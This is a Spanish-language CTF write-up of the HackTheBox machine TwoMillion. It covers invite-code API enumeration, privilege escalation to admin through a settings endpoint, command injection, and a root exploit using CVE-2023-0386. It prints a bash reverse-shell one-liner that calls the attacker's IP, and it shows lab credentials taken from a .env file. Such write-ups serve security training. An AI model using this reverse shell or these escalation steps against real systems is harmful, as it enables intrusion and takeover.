---
title: "HackTheBox: TwoMillion - API Enumeration, Information Disclosure, and Kernel Privilege Escalation (CVE-2023-0386)"
tags:
  - HackTheBox
  - API-Exploitation
  - Information-Disclosure
  - BurpSuite
  - ROT13
  - LFI
  - ENV-File-Disclosure
  - CVE-Exploitation
  - Kernel-Privesc
  - OverlayFS
  - Linux-Exploitation
categories:
  - CTF-Writeup
  - Web-Exploitation
  - Linux-Privesc
date: 2024-10-20
description: "Technical writeup detailing the compromise of the TwoMillion machine. Initial access involves decoding ROT13-encrypted data from JavaScript to find an API endpoint, followed by manipulating API parameters to gain administrator privileges via Insecure Direct Object Reference (IDOR), leading to a reverse shell injection. Local Privilege Escalation is achieved by disclosing plaintext credentials from a '.env' file for SSH access, and finally, exploiting the unpatched Linux Kernel vulnerability, CVE-2023-0386 (OverlayFS/FUSE), to gain root privileges."
updated: 2025-11-25
abbrlink: twomillion
---

![TM HackTheBox](tm-hackthebox.png)

## Introduction

TwoMillion es una máquina de la plataforma **[HackTheBox](https://app.hackthebox.com/profile/2035837)**. En esta ocasión nos encontraremos con dos puertos abiertos 22/SSH y 80/HTTP. Obtendremos un codigo de invitación descifrando código encriptado, enumeraremos una API para poder acceder como administrador, inyectaremos una reverse shell, encontraremos una base de datos lo que nos llevara a encontrar usuario y contraseña en un archivo .env y debido a que el Kernel Linux está desactualizado se puede utilizar CVE-2023-0386 para escalar privilegios.

~~~
Platform: HackTheBox
Level: Easy
OS: Linux
~~~

## Reconnaissance 

Inicialmente, usamos el comando **Ping**. Este utiliza el **ICMP (Protocolo de Control de Mensajes de Internet)**. Específicamente, **Ping** envía un mensaje de “echo request” a una **dirección IP** y espera recibir un mensaje de “echo response” en respuesta. Este proceso nos permite verificar si una máquina en la red es accesible y medir el tiempo que tarda en recibir una respuesta (conocido como latencia). Ademas, podemos inferir que es una máquina **Linux** debido al **Time To Leave** (**ttl**) que en este caso es **63** (si fuese en su lugar **128** o un número cercano a este, sería una máquina **Windows**)

![TwoMillion yw4rf](tm-1.png)

## Scanning

Como vemos, el paquete fue recibido por la máquina victima. Una vez verificada la conexión, empezamos a realizar un escaneo de multiples etapas con la herramienta **Nmap**. Primero, haremos un escaneo de puertos abiertos

![TwoMillion yw4rf](tm-2.png)

Vemos que tenemos los puertos **22/SSH** y **80/HTTP**. Procedemos a hacer un escaneo más detallado de los mismos con el fin de obtener más información. Esto lo haremos con la flag `-sCV`

![TwoMillion yw4rf](tm-3.png)

## Enumeration

### 22/SSH

La versión del puerto 22 que ejecuta el servicio SSH es **OpenSSH 8.9p1**, no encontramos ninguna vulnerabilidad para está versión de momento.

### 80/HTTP

Por lo visto, el puerto 80 ejecuta HTTP, un servidor web **nginx**. Haremos uso de **whatweb** para obtener más información acerca del sitio web. Como vemos, nos reporta el estado **301 Moved Permanently** el cual nos indica que el recurso solicitado ha sido trasladado de manera permanente a una nueva URL: **2million.htb/** además notamos que informa un error al dirigirse al sitio **ERROR Opening: http:// 2.million.htb/ - no adress for 2million.htb**

![TwoMillion yw4rf](tm-4.png)

Tal error se soluciona añadiendo el sitio al **/etc/hosts**

![TwoMillion yw4rf](tm-5.png)

Primero indicamos la **dIrección IP** y luego el **dominio**. 

![TwoMillion yw4rf](tm-6.png)

Hecho esto ya podriamos ingresar a la web: Vemos que es un sitio para practicas de pentesting con laboratorios.

![TwoMillion yw4rf](tm-7.png)

Al navegar por la misma notamos que los unicos elementos con los cuales es posible interactuar son las secciones **join** y **login**

![TwoMillion yw4rf](tm-8.png)

Al tocar el boton de **Join HTB** de la sección nos redirige a un panel donde es necesario un **codigo de invitación** para poder registrarse

![TwoMillion yw4rf](tm-9.png)

Al realizar `CTRL + U` para poder ver el codigo fuente notamos que hay código en **JavaScript** que al parecer es  el funcionamiento del panel del codigo de invitación. Además notamos que en **scripts** hay un **path** interesante: **/js/inviteapi.min.js** por lo que parece es el funcionamiento de la **API** de invitación por código

![TwoMillion yw4rf](tm-10.png)

Al ingresar el **path** a la URL nos redirige a código ofuscado, vemos lo que parecen ser las funciones declaradas para que la **API** pueda funcionar correctamente. Entre ellas hay una que nos llama la atención: **makeInviteCode**

![TwoMillion yw4rf](tm-11.png)

Al llamar a **makeInviteCode** por la consola del navegador nos confirma que si, es una función

![TwoMillion yw4rf](tm-12.png)

Al declararla con **makeInviteCode()** vemos la pista: **"Data is encrypted... we should probably check the encryption type in order to decrypt it"** 

Data: **"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr**
Enctype: **"ROT13"**

![TwoMillion yw4rf](tm-13.png)

Al descifrar la data nos dice: **In order to generate the invite code, make a POST request to /api/v1/invite/generate** 

![TwoMillion yw4rf](tm-14.png)

Al hacer **POST request** con **curl** a **http:// 2million/api/v1/invite/generate** nos da el código al final encriptado en **base64**

![TwoMillion yw4rf](tm-15.png)

Al descifrar el código en **base64** obtenemos el **código de invitación** para poder registrarnos

![TwoMillion yw4rf](tm-16.png)

Verificamos si el código es el correcto al colocarlo en la página 

![TwoMillion yw4rf](tm-17.png)

Rellenamos el formulario para poder ingresar correctamente

![TwoMillion yw4rf](tm-18.png)

Al ingresar correctamente vemos varias secciones

![TwoMillion yw4rf](tm-19.png)

La que más llama la atención es la sección de **Access** la cual nos permite generar una **VPN** vemos que hay dos botones: **Connection Pack** y **Regenerate**

![TwoMillion yw4rf](tm-20.png)

Al ver el código fuente de estos dos botones notamos que son funciones de la **API** 

![TwoMillion yw4rf](tm-21.png)

Usamos **Burpsuit** para interceptar las peticiones

![TwoMillion yw4rf](tm-22.png)

Al ver las respuestas de la petición **api/v1/user/vpn/generate** vemos que utiliza el método **GET** y que efectivamente nos genera una **VPN**

![TwoMillion yw4rf](tm-23.png)

Al hacer una petición con el método **GET** a **/api/v1** vemos el **endpoint** de la **API**

![TwoMillion yw4rf](tm-24.png)

Nos llama la atención **admin** y por lo vemos tiene la función de autenticar si un usuario es **admin**. Haremos una petición **GET** al path **api/v1/admin/auth** con el fin de autenticarnos.

![TwoMillion yw4rf](tm-25.png)

Nos da como respuesta **"message": false** por lo que no somos **admin**. Intentaremos hacer una petición con el método **PUT** al path **/api/v1/admin/settings/update** que al parecer tiene la función de actualizar la configuración de un usuario en específico

![TwoMillion yw4rf](tm-26.png)

Nos informa que **"message": "Invalid content type"** por lo que inferimos es por el tipo de formato no especificado. Agregamos la línea **Content-Type: application/json** en la petición

![TwoMillion yw4rf](tm-27.png)

Ahora nos dice **"message": "Missing parameter: email"** por lo que falta el parametro de email, agregamos el correo que colocamos a la hora de registrarnos en formato **Json** 

![TwoMillion yw4rf](tm-28.png)

Ahora dice **"message": "Missing parameter: is_admin"** creo que el parametro es para indicar si el usuario tiene privilegios de administrador. Lo verificamos haciendo una nueva petición con el método **GET** a **/api/v1/admin/auth** colocando un **0** y como vemos nos dice **"message": false** por lo que no tenemos permisos de administrador

![TwoMillion yw4rf](tm-29.png)

Siguiendo esta lógica al colocar **"is_admin": 1** tendriamos que tener permisos de administrador

![TwoMillion yw4rf](tm-30.png)

Al verificarlo haciendo una petición con el método **GET** a **/api/v1/admin/auth** nos da **"message": true** por lo que ya tenemos permisos de administrador

![TwoMillion yw4rf](tm-31.png)

Al ver el **endpoint** de la **API** notamos que es posible generar una **VPN** con permisos de administrador mediante el método **POST** a **/api/v1/admin/vpn/generate** al hacerlo nos dice que falta el parametro de **username**

![TwoMillion yw4rf](tm-32.png)

Al colocar el parametro **username** y mandar la petición notamos que funciono correctamente generando asi la **VPN** con permisos de administrador

![TwoMillion yw4rf](tm-33.png)

## Exploitation

Intentamos **inyectar código** desde el campo de username y notamos que funciona, por lo que podriamos optar por ejecutar una **reverse shell** para conectarnos desde nuestra máquina.

![TwoMillion yw4rf](tm-34.png)

Primero nos ponemos en escucha con **Netcat** al puerto que utilizaremos en la **reverse shell**

![TwoMillion yw4rf](tm-35.png)

Utilizare esta **reverse shell**: `bash -c 'bash -i >&/dev/tcp/10.10.14.165/1717 0>&1';` 

![TwoMillion yw4rf](tm-36.png)

Al estar en escucha y ejecutar la **reverse shell** obtenemos acceso al sistema como **www-data**

![TwoMillion yw4rf](tm-37.png)

En primer lugar, realizamos **tratamiento de la tty** 

![TwoMillion yw4rf](tm-38.png)

![TwoMillion yw4rf](tm-39.png)

Una vez hecho el **tratamiento de la tty** listamos archivos y directorios en el directorio actual, encontramos una base de datos **Database.php** y la abrimos con **cat**

![TwoMillion yw4rf](tm-40.png)

Notamos que las primeras lineas nos indican:

~~~
private $host;
private $user;
private $pass;
private $dbname;
~~~

Por lo que inferimos que la base de datos está diseñada para conectarse a un sistema de gestión de bases de datos (**DBMS**) tales como **MySQL, PostgreSQL, SQLite,** etc. Los valores podrian estar almacenados en archivos de configuración o variables de entorno. Para encontrarlos listamos los archivos ocultos del directorio actual y encontramos el archivo **.env** el cual se utiliza para definir variables de entorno.

![TwoMillion yw4rf](tm-41.png)

Al mostrar el contenido del archivo vemos los valores. Encontramos el usuario y la contraseña

Username: **admin**
Password: **SuperDuperPass123**

![TwoMillion yw4rf](tm-42.png)

Recordemos que teníamos el **puerto 22/SSH** abierto por lo que intentaremos acceder mediante estas credenciales al servicio SSH del objetivo.

![TwoMillion yw4rf](tm-43.png)

Al ingresar notamos algo interesante el mensaje **"You have mail"** nos informa que tenemos un mensaje. Intentaremos encontrar la ruta donde se úbica el mensaje mediante el comando `find / -iname mail` pero como vemos nos sale muchisima información, esto debido a que nos muestra también las rutas a las que no tenemos acceso **"Permission denied"** 

![TwoMillion yw4rf](tm-44.png)

Al filtrar los resultados con `| grep -v "proc"` observamos la ruta **/var/mail** 

![TwoMillion yw4rf](tm-45.png)

## Privilege Escalation

Al acceder a la misma listamos el contenido y encontramos un archivo **admin**, al mostrar el contenido con **cat** vemos el mensaje del cual nos habían informado al ingresar. El mensaje dice que se debe actualizar el sistema operativo debido a que en la versión del **kernel de linux** en la que se encuentran hay una vulnerabilidad, nos dan una pista de esta vulnerabilidad al mencionar **OverlayFS / FUSE** 

![TwoMillion yw4rf](tm-46.png)

Al buscar "**OverlayFS / Fuse vulnerability**" en Google nos encontramos con el **[CVE-2023-0386](https://ubuntu.com/security/CVE-2023-0386)** la cual afecta las versiones de **Ubuntu 22.04** 

![TwoMillion yw4rf](tm-47.png)

Al verificar la versión del sistema del objetivo notamos que es **Ubuntu 22.04.2** por lo cual esta vulnerabilidad es posible que funcione

![TwoMillion yw4rf](tm-48.png)

Clonamos el repositorio de Github de **[Xkaneiki](https://github.com/xkaneiki/CVE-2023-0386/tree/main)** 

![TwoMillion yw4rf](tm-49.png)

Entramos a la carpeta del repositorio y desde dentro comprimimos el contenido con   `tar -czvf CVE-2023-0386.tar.gz .`

![TwoMillion yw4rf](tm-50.png)

Una vez comprimido el repositorio lo transfiero a la máquina objetivo con **scp**

![TwoMillion yw4rf](tm-51.png)

Una vez con el repositorio en la máquina objetivo lo descomprimimos con **tar** nuevamente para poder utilizarlo

![TwoMillion yw4rf](tm-52.png)

Con todo esto hecho podemos ejecutar el exploit

![TwoMillion yw4rf](tm-53.png)

![TwoMillion yw4rf](tm-54.png)

Como nos indica el repositorio primero debemos compilar el contenido, esto lo hacemos con `make all` 

![TwoMillion yw4rf](tm-55.png)

Una vez ejecutado el comando `make all` que compila el exploit, nos indica que debemos ejecutar `./fuse ./ovlcap/lower ./gc `

![TwoMillion yw4rf](tm-56.png)

Por último, nos indica que ejecutamos `./exp` en otra terminal diferente pero en la misma ubicación en la que se encuentra el exploit desde la máquina victima

![TwoMillion yw4rf](tm-57.png)

Como vemos somos **root**, tenemos control total del sistema y por ende hemos finalizado la máquina.

![TwoMillion yw4rf](tm-pwnd.png)